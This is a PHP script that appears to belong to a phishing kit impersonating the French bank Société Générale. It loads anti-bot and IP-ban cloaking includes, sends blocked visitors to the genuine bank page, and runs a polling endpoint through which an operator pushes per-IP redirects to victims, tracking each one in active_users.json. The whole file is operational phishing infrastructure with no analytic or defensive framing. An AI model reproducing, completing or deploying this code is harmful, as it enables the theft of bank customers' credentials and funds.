<?php

error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}

$ip = $_SERVER['REMOTE_ADDR'];
$filepath = 'redirects.json';

if (!file_exists($filepath)) {
    echo json_encode(['status' => 'waiting']);
    exit;
}

$redirects = json_decode(file_get_contents($filepath), true);

if (isset($redirects[$ip])) {
    $url = $redirects[$ip];

    // Marquer l'utilisateur comme redirigé dans active_users.json
    $usersFile = 'active_users.json';
    if (file_exists($usersFile)) {
        $users = json_decode(file_get_contents($usersFile), true);
        if (isset($users[$ip])) {
            $users[$ip]['status'] = 'redirected';
            file_put_contents($usersFile, json_encode($users, JSON_PRETTY_PRINT));
        }
    }

    // Supprimer la redirection après l’avoir renvoyée (optionnel)
    unset($redirects[$ip]);
    file_put_contents($filepath, json_encode($redirects, JSON_PRETTY_PRINT));

    echo json_encode(['status' => 'redirect', 'url' => $url]);
} else {
    echo json_encode(['status' => 'waiting']);
}
?>
